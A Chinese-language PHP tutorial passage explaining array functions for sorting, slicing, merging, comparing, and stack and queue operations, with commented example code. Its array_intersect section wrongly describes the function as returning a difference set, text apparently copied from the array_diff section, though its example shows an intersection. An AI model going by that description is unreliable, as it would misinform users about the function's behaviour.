<li>SORT_REGULAR-是默认值，将自动识别数组元素的类型进行排序</li>
<li>SORT_NUMERIC-用于数字元素的排序</li>
<li>SORT_STRING-用于字符串元素的排序</li>
<li>SORT_LOCALE_STRING-根据当前的locale设置来把元素当做字符串比较</li>
</ul>
<p>sort()函数对数组中的元素值按照由小到大顺序进行排序，rsort()函数则按照由大到小的顺序对元素的值进行排序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data = array(5,8,1,7,2);  //声明一个数组$data, 存放5个整数元素</span><br><span class="line"></span><br><span class="line">	sort($data);               //使用sort()函数将数组$data中的元素值按照由小到大顺序进行排序</span><br><span class="line">	print_r($data);            //输出：Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 5 [3] =&gt; 7 [4] =&gt; 8 )</span><br><span class="line"></span><br><span class="line">	rsort($data);              //使用rsort()函数将数组$data按照由大到小的顺序对元素的值进行排序</span><br><span class="line">	print_r($data);            //输出：Array ( [0] =&gt; 8 [1] =&gt; 7 [2] =&gt; 5 [3] =&gt; 2 [4] =&gt; 1 )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="根据键名对数组排序">根据键名对数组排序</span></h4><p>根据键名对数组重新排序，ksort()和krsort()函数可以实现。ksort()函数按照键名对数组进行由小到大的排序，krsort()函数和ksort()相反，排序后为数组值保留原来的键。使用的格式与sort()和rsort()相同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data = array(5=&gt;&quot;five&quot;,8=&gt;&quot;eight&quot;,1=&gt;&quot;one&quot;,7=&gt;&quot;seven&quot;,2=&gt;&quot;two&quot;);  //声明一个键值混乱的数组</span><br><span class="line">	</span><br><span class="line">	ksort($data);      //使用ksort()函数按照键名对数组$data进行由小到大的排序</span><br><span class="line">	print_r($data);    //输出：Array ( [1] =&gt; one [2] =&gt; two [5] =&gt; five [7] =&gt; seven [8] =&gt; eight )</span><br><span class="line"></span><br><span class="line">	krsort($data);     //使用krsort()函数按照键名对数组$data进行由大到小的排序</span><br><span class="line">	print_r($data);    //输出：Array ( [8] =&gt; eight [7] =&gt; seven [5] =&gt; five [2] =&gt; two [1] =&gt; one )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="根据元素的值对数组排序">根据元素的值对数组排序</span></h4><p>使用数组中元素的值进行排序来取代键值排序。asort()和arsort()函数将保留原有键名和值的关系。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data = array(&quot;l&quot;=&gt;&quot;Linux&quot;, &quot;a&quot;=&gt;&quot;Apache&quot;,&quot;m&quot;=&gt;&quot;MySQL&quot;,&quot;p&quot;=&gt;&quot;PHP&quot;);</span><br><span class="line">	</span><br><span class="line">	asort($data);     //使用asort()函数将数组$data按元素的值升序排序，并保留原有的键名和值</span><br><span class="line">	print_r($data);   //输出：Array ( [a] =&gt; Apache [l] =&gt; Linux [m] =&gt; MySQL [p] =&gt; PHP )</span><br><span class="line"></span><br><span class="line">	arsort($data);    //使用arsort()函数将数组$data按元素的值降序排序，并保留原有的键名和值</span><br><span class="line">	print_r($data);   //输出：Array ( [p] =&gt; PHP [m] =&gt; MySQL [l] =&gt; Linux [a] =&gt; Apache )</span><br><span class="line">	</span><br><span class="line">	rsort($data);     //使用asort()函数将数组$data按元素的值降序排序，但原始键名被忽略</span><br><span class="line">	print_r($data);   //输出：Array ( [0] =&gt; PHP [1] =&gt; MySQL [2] =&gt; Linux [3] =&gt; Apache ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="根据自然排序法对数组排序">根据“自然排序”法对数组排序</span></h4><p>“自然排序”法，即数字从1到9的排序方法，字母从a到z的排序方法，短者优先。使用natsort()进行“自然排序”法的数组排序，该函数的排序结果是忽略键名的。函数netcasesort()是用“自然排序”算法对数组尽心不区分大小写的排序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data = array(&quot;file1.txt&quot;, &quot;file11.txt&quot;, &quot;File2.txt&quot;, &quot;FILE12.txt&quot;, &quot;file.txt&quot;);</span><br><span class="line">	</span><br><span class="line">	natsort($data);      //普通的“自然排序”</span><br><span class="line">	print_r($data);      //输出排序后的结果，数组中包括大小写，输出不是正确的排序结果</span><br><span class="line"></span><br><span class="line">	natcasesort($data);  //忽略大小写的“自然排序”</span><br><span class="line">	print_r($data);      //输出“自然排序”后的结果，正常结果</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="根据用户自定的规则对数组排序">根据用户自定的规则对数组排序</span></h4><p>usort()、uasort()和uksort()等函数提供了可以通过创建你自己的比较函数作为回调函数的数组排序函数。它们的使用格式一样，并具有相同的参数列表，区别在于对键还是值进行排序。<br>这三个函数将用户自定义的比较函数对一个数组中的值进行排序。如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用这几个函数。在自定义的回调函数中，需要两个参数，分别依次传入数组中连续的两个元素。比较函数比较在第一个参数被认为小于、等于或大于第二个参数时分别返回一个小于，等于或大于零的整数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$lamp = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);   //声明一个数组，其中元素值的长度不相同</span><br><span class="line"></span><br><span class="line">	usort($lamp, &quot;sortByLen&quot;);          		    //使用usort()函数传入用户自定义的回调函数进行数组排序</span><br><span class="line">	print_r($lamp);   	             // 排序后输出：Array ( [0] =&gt; PHP [1] =&gt; MySQL [2] =&gt; Linux [3] =&gt; Apache )</span><br><span class="line">	</span><br><span class="line">	function sortByLen($one, $two) &#123;     //自定义的函数做为回调用函数提供给usort()函数使用</span><br><span class="line">		if (strlen($one) == strlen($two))  //如果两个参数长度相等返回0，在数组中位置不变</span><br><span class="line">			return 0;</span><br><span class="line">		else       		     //第一个参数大于第二个参数返回大于0的数，否则返回小于0的数</span><br><span class="line">			return (strlen($one) &gt; strlen($two)) ? 1 : -1;  </span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="多维数组的排序">多维数组的排序</span></h4><p>php允许在多维数组上执行一些比较复杂的排序。可以使用array_multisort()函数对多个数组或多维数组进行排序，或者根据某一维或多维对多维数组进行排序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool array_multisort(array ar1[,mixed arg[,mixed ...[,array ...]]])</span><br></pre></td></tr></table></figure></p>
<p>该函数如果成功则返回TRUE，失败则返回FLASE。第一个参数是要排序的主要数组。数组中的值比较为相同的话，就按照下一个输入数组中相应值的大小来排序，以此类推。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$data = array(                   	 //声明一个$data数组，模拟了一个行和列数组</span><br><span class="line">	  		array(&quot;id&quot; =&gt; 1, &quot;soft&quot; =&gt; &quot;Linux&quot;, &quot;rating&quot; =&gt; 3),</span><br><span class="line">			array(&quot;id&quot; =&gt; 2, &quot;soft&quot; =&gt; &quot;Apache&quot;, &quot;rating&quot; =&gt; 1),</span><br><span class="line">			array(&quot;id&quot; =&gt; 3, &quot;soft&quot; =&gt; &quot;MySQL&quot;, &quot;rating&quot; =&gt; 4),</span><br><span class="line">			array(&quot;id&quot; =&gt; 4, &quot;soft&quot; =&gt; &quot;PHP&quot;, &quot;rating&quot; =&gt; 2),</span><br><span class="line">		); </span><br><span class="line">	//使用foreach遍历创建两个数组作为array_multisort的参数</span><br><span class="line">	foreach ($data as $key =&gt; $value) &#123;</span><br><span class="line">		$soft[$key] = $value[&quot;soft&quot;];     //将$data中的每个数组元素中键值为soft的值形成数组$soft</span><br><span class="line">		$rating[$key] = $value[&quot;rating&quot;];  //将每个数组元素中键值为rating的值形成数组$rating</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	array_multisort($rating, $soft, $data);   //使用array_multisort()函数传入三个数组进行排序</span><br><span class="line">	print_r($data);                      	  //输出排序后的二维数组</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="拆分-合并-分解和接合数组">拆分、合并、分解和接合数组</span></h3><h4><span id="函数array_slice">函数array_slice()</span></h4><p>array_slice()函数的作用是在数组中根据条件取出一段值并返回。如果数组有字符串键，所返回的数组将保留键名。该函数可以设置四个参数。第一个参数array是必选项，调用时输入要处理的数组。第二个参数offset也是必须的参数，需要传入一个数组，规定取出元素的开始位置。如果是正数，则从前往后开始取，如果是负值，从后向前取offset绝对值数目的元素。<br>第三个参数是可选的，需要传入一个数值，规定被返回数组的长度，如果是负数则从后往前，选取该值绝对值数目的元素。如果未设置该值，则返回所有元素。第四个参数也是可选的，需要一个布尔类型的值，如果为TRUE值则所返回的数组将保留键名。设置为FLASE值，也是默认值将重新设置索引键值。注意的是，如果数组有字符串键，所返回的数组将保留键名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);     //声明一个索引数组$lamp包含4个元素</span><br><span class="line">	//使用array_slice()从第二个开始取(0是第一个，1为第二个)，取两个元素从数组$lamp中返回</span><br><span class="line">	print_r(array_slice($lamp,1,2));                    //输出：Array ( [0] =&gt; Apache [1] =&gt; MySQL )</span><br><span class="line">	//第二个参数使用负数参数为-2，从后面第二个开始取，返回一个元素</span><br><span class="line">	print_r(array_slice($lamp,-2,1));                   //输出： Array ( [0] =&gt; MySQL ) </span><br><span class="line">	//最后一个参数设置为 true，保留原有的键值返回</span><br><span class="line">	print_r(array_slice($lamp,1,2,true));               //输出：Array ( [1] =&gt; Apache [2] =&gt; MySQL ) </span><br><span class="line"></span><br><span class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);     //声明一个关联数组</span><br><span class="line">   	//如果数组有字符串键，默认所返回的数组将保留键名</span><br><span class="line">	print_r(array_slice($lamp,1,2));                    //输出：Array ( [b] =&gt; Apache [c] =&gt; MySQL ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_splice">函数array_splice()</span></h4><p>array_splice()和array_slice()函数类似，选择数组中的一系列元素，但不返回，而是删除他们并用其他值代理。如果提供了第四个参数，则之前选中的那些元素将被第四个参数指定的数组取代，最后生成的数组将会返回。<br>第一个参数array为必选项，规定要处理的数组。第二个参数offset也是必选项，调用时传入数值。如果offset为正数，则输入数组中该值指定的偏移量开始移除，如果offset为负，则从输入数组末尾倒数该值指定的偏移量开始移除。第三个参数length是可选的，也需要一个数值，如果省略该参数，则移除数组中从offset到结尾的所有部分。如果指定了length并且为正值，则移除这么多元素。如果指定了length且为负值，则移除从offset到数组末尾倒数length为止中间所有的元素。第四个参数array也是可选的，被移除的元素由此数组中的元素替代。如果没有移除任何值，则此数组中的元素将插入到指定位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</span><br><span class="line">	array_splice($input, 2);      	 //原数组中的第二个元素后到数组结尾都被删除</span><br><span class="line">	print_r($input);                 //输出：Array ( [0] =&gt; Linux [1] =&gt; Apache )</span><br><span class="line"></span><br><span class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</span><br><span class="line">	array_splice($input, 1, -1);     //从第二个开始移除直到数组末尾倒数1个为止中间所有的元素</span><br><span class="line">	print_r($input);                 //输出：Array ( [0] =&gt; Linux [1] =&gt; PHP )</span><br><span class="line"></span><br><span class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</span><br><span class="line">	array_splice($input, 1, count($input), &quot;web&quot;);      //从第二个元素到数组结尾都被第4个参数替代</span><br><span class="line">	print_r($input);                                    //输出：Array ( [0] =&gt; Linux [1] =&gt; web )</span><br><span class="line"></span><br><span class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</span><br><span class="line">	array_splice($input, -1, 1, array(&quot;web&quot;, &quot;www&quot;));  //最后一个元素被第4个参数数组替代</span><br><span class="line">	print_r($input); //输出：Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; MySQL [3] =&gt; web [4] =&gt; www )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数array_combine">函数array_combine()</span></h4><p>array_combine()函数的作用是通过合并两个数组来创建一个新数组。其中的一个数组是键名，另一个数组的值为键值。如果其中一个数组为空，或者两个数组的元素个数不同，则该函数返回false。<br>该函数有两个参数且都是必选项，两个参数必须有相同数目的元素。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a1=array(&quot;OS&quot;,&quot;WebServer&quot;,&quot;DataBase&quot;,&quot;Language&quot;);    //声明第一个数组作为参数1</span><br><span class="line">	$a2=array(&quot;Linux&quot;,&quot;Apache&quot;,&quot;MySQL&quot;,&quot;PHP&quot;);            //声明第二个数组作为参数2</span><br><span class="line">	print_r(array_combine($a1,$a2));                      //使用arrray_combine()将两个数组合并</span><br><span class="line">//输出：Array ( [OS] =&gt; Linux [WebServer] =&gt; Apache [DataBase] =&gt; MySQL [Language] =&gt; PHP )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数array_merge">函数array_merge()</span></h4><p>array_merge()函数的作用是把一个或多个数组合并为一个数组，如果键名有重复，该键的键值为最后一个键名的值（后面的覆盖前面的）。如果数组是数字索引的，则键名会以连续方式重新索引。注意如果仅仅向array_merge()函数输入了一个数组，且键名是整数，则该函数将返回带有整数键名的新数组，其键名以0开始进行重新索引。<br>该函数第一个参数是必选项，需要传入一个数组。可以有多个可选参数。但必须都是数组类型的数据。返回将多个数组合并后的新数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a1=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;);</span><br><span class="line">	$a2=array(&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;b&quot;=&gt;&quot;PHP&quot;);</span><br><span class="line">	print_r(array_merge($a1,$a2)); 	//输出： Array ( [a] =&gt; Linux [b] =&gt; PHP [c] =&gt; MySQL ) </span><br><span class="line">	</span><br><span class="line">	//仅使用一个数组参数则键名以0开始进行重新索引</span><br><span class="line">	$a=array(3=&gt;&quot;PHP&quot;,4=&gt;&quot;MySQL&quot;);</span><br><span class="line">	print_r(array_merge($a));	 //输出：Array ( [0] =&gt; PHP [1] =&gt; MySQL ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数array_intersect">函数array_intersect()</span></h4><p>array_intersect()函数的作用是返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的元素值。返回的数组中，键名保持不变。<br>第一个参数是必选项，传入与其他数组进行比较的数组。第二个参数也是必选项，传入与第一个数组进行比较的数组。可以有多个可选参数作为以后的参数，与第一个数组进行比较的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a1=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);  	  //声明第一个数组，作为比较的第一个参数</span><br><span class="line">	$a2=array(&quot;Linux&quot;, &quot;Tomcat&quot;, &quot;MySQL&quot;, &quot;JSP&quot;);     //声明第二个数组，作为比较的第二个参数</span><br><span class="line">	print_r(array_intersect($a1,$a2));                //输出Array ( [0] =&gt; Linux [2] =&gt; MySQL ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_diff">函数array_diff()</span></h4><p>array_diff()函数的作用是返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的元素值。在返回到数组中，键名保持不变。<br>第一个参数是必选项，传入与其他数组进行比较的数组。第二个参数也是必选项，传入与第一个数组进行比较的数组。第三个参数以后都是可选项，可用一个或任意多个数组与第一个数组进行比较，本函数仅有值用于比较。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a1=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);    //声明第一个数组，作为比较的第一个参数</span><br><span class="line">	$a2=array(&quot;Linux&quot;, &quot;Tomcat&quot;, &quot;MySQL&quot;, &quot;JSP&quot;);    //声明第二个数组，作为比较的第二个参数</span><br><span class="line">	print_r(array_diff($a1,$a2));                    //输出:Array ( [1] =&gt; Apache [3] =&gt; PHP ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="数组与数据结构">数组与数据结构</span></h3><h4><span id="使用数组实现堆栈">使用数组实现堆栈</span></h4><p>堆栈是数据结构的一种实现形式，是使用非常广泛的存储数据的一种容器。在堆栈这种容器中，最后压入的数据（进栈），将会被最先弹出（出栈）。即在数据存储事采用“先进后出”的数据结构。在PHP中，将数组当做一个栈，使用array_push()和array_pop()两个系统函数即可完成数据的进栈和出栈操作。</p>
<p>array_push()函数向第一个参数的数组尾部添加一个或者多个元素(入栈),然后返回新数组的长度。该函数等于多次调用$array[]=$value。<br>该函数的第一个参数是必选的，作为栈容器的第一个数组。第二个参数也是必选的，在第一个参数中的数组尾部添加的一个数据。还可以有多个可选参数，都可以添加到第一个参数的数组中的尾部，即入栈。但要注意计时数组中有字符串键名，添加的元素也始终是数字键，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;Web&quot;);             	//声明一个数当作为栈，数为数组array_push()函数第一个参数</span><br><span class="line">	echo array_push($lamp,&quot;Linux&quot;);   	//将字符串”Linux”压入数组$lamp中，返回数组中元素个数2</span><br><span class="line">	print_r($lamp);                		//输出数组中（栈）成员：Array ( [0] =&gt; Web [1] =&gt; Linux )</span><br><span class="line"></span><br><span class="line">     	//又连续压入三个数据到数组$lamp的尾部</span><br><span class="line">	echo array_push($lamp,&quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);    //输出栈中元素的长度为5</span><br><span class="line">	print_r($lamp);    //输出： Array ( [0] =&gt; Web [1] =&gt; Linux [2] =&gt; Apache [3] =&gt; MySQL [4] =&gt; PHP )</span><br><span class="line"></span><br><span class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;);    	    //带有字符串键的数组</span><br><span class="line">	echo array_push($lamp,&quot;MySQL&quot;,&quot;PHP&quot;);     	     //压入两个元素到数组的尾部, 输出栈长度为4</span><br><span class="line">	print_r($lamp);    // Array ( [a] =&gt; Linux [b] =&gt; Apache [0] =&gt; MySQL [1] =&gt; PHP )   //也是数字键</span><br><span class="line">   </span><br><span class="line">    	$lamp[&quot;web&quot;]=&quot;www&quot;;   //使用array_push()函数和使用这种直接赋值初使化数组的方式是一样的</span><br><span class="line">	print_r($lamp);       //Array ( [a] =&gt; Linux [b] =&gt; Apache [0] =&gt; MySQL [1] =&gt; PHP [web] =&gt; www )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>array_pop()函数删除数组中的最后一个元素，即将数组最后一个单元弹出（出栈），并将数组的长度减1，如果数组为空（或者不是数组）将返回NULL。<br>该函数只有一个参数，即作为栈的数组。返回弹出的数组中最后一个元素的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;Linux&quot;,&quot;Apache&quot;,&quot;MySQL&quot;, &quot;PHP&quot;); //声明一个数组作为栈</span><br><span class="line"></span><br><span class="line">	echo array_pop($lamp);  //弹出数组中最后的元素并返回被删除的值，输出PHP</span><br><span class="line">	print_r($lamp);         //被弹出后的结果:Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; MySQL ) </span><br><span class="line"></span><br><span class="line">	echo array_pop($lamp);  //再弹出数组中最后的元素并返回被删除的值，输出MySQL</span><br><span class="line">	print_r($lamp);         //被弹出后的结果:Array ( [0] =&gt; Linux [1] =&gt; Apache ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="使用数组实现队列">使用数组实现队列</span></h4><p>PHP中的数组处理函数还可以将数组实现队列的操作。堆栈是“后劲先出”，而一个队列则允许在一段插入数据，在另一端删除数据，也就是实现最先进入队列的数据最先退出队列，即队列是“先进先出”的原则。<br>函数array_shift()可以实现删除数组中的第一个元素，并返回被删除元素的值。<br>该函数只有一个必选参数，其参数为实现队列的数组。将数组中的第一个单元一处并作为结构返回，并将数组的长度减1，还将所有其他的元素向前移动一位。所有的数字键名将改为0开始计数，字符串键名将保持不变。如果数组为空（或不是数组），则返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">	//带有字符串键值的关联数组</span><br><span class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;, &quot;b&quot;=&gt;&quot;Apache&quot;, &quot;c&quot;=&gt;&quot;MySQL&quot;, &quot;d&quot;=&gt;&quot;PHP&quot;);</span><br><span class="line">	echo array_shift($lamp);  //删除数组第一个元素并返回，输出Linux</span><br><span class="line">	print_r ($lamp);          //字符串键值保持不变：Array ( [b] =&gt; Apache [c] =&gt; MySQL [d] =&gt; PHP )</span><br><span class="line"></span><br><span class="line">	//带有数字键的索引数组</span><br><span class="line">	$lamp=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</span><br><span class="line">	echo array_shift($lamp);   //删除数组第一个元素并返回，输出Linux</span><br><span class="line">	print_r ($lamp);           //数字下标重新索引Array ( [0] =&gt; Apache [1] =&gt; MySQL [2] =&gt; PHP ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在PHP中还可以使用array_unshift()函数在队列数组的开头插入一个或者多个元素，该函数执行成功将返回插入元素个数，使用格式和函数array_push()是一样的。</p>
<h3><span id="其他有用的数组处理函数">其他有用的数组处理函数</span></h3><h4><span id="函数array_rand">函数array_rand()</span></h4><p>array_rand()函数从数组中随机选出一个或多个元素，并返回。该函数有两个参数，第一个参数为必选项，它接受一个数组作为输入数组，从这个数组中随机选出一个或多个元素。第二个参数是一个可选的参数，指明了你想取出多少个元素，如果没有指定，默认从数组中取出一个元素。如果只取出一个，array_rand()函数返回一个随机元素的键名，否则就返回一个包含随机键名的数组。这样就可以随机从数组中取出键名和值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;, &quot;b&quot;=&gt;&quot;Apache&quot;, &quot;c&quot;=&gt;&quot;MySQL&quot;, &quot;d&quot;=&gt;&quot;PHP&quot;);</span><br><span class="line">	echo array_rand($lamp,1);           	     //随机从数组$lamp中取1个元素的键值，例如b</span><br><span class="line">	echo $lamp[array_rand($lamp)].&quot;&lt;br&gt;&quot;; 	     //通过随机的一个元素的键值获取数组中一个元素的值</span><br><span class="line">	$key=array_rand($lamp,2);           	     //随机从数组$lamp中取2个元素的键值赋给数组$key</span><br><span class="line">	echo $lamp[$key[0]].&quot;&lt;br&gt;&quot;;         	     //通过数组$key中第一个值获取数组$lamp中一个元素的值</span><br><span class="line">	echo $lamp[$key[1]].&quot;&lt;br&gt;&quot;;          	     //通过数组$key中第二个值获取数组$lamp中另个元素的值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数shuffle">函数shuffle()</span></h4><p>shuffle()函数把数组中的元素按随机顺序重新排列，即将数组中的顺序打乱。若成功则返回TRUE，否则返回FALSE。只需要一个数组作为参数，每执行一次则返回不同顺序的数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;, &quot;b&quot;=&gt;&quot;Apache&quot;, &quot;c&quot;=&gt;&quot;MySQL&quot;, &quot;d&quot;=&gt;&quot;PHP&quot;);</span><br><span class="line">	shuffle($lamp);     //将传入的数组$lamp按随机顺序重新排列</span><br><span class="line">	print_r($lamp);     //每执行一次shuffle()函数则返回不同顺序的数组</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
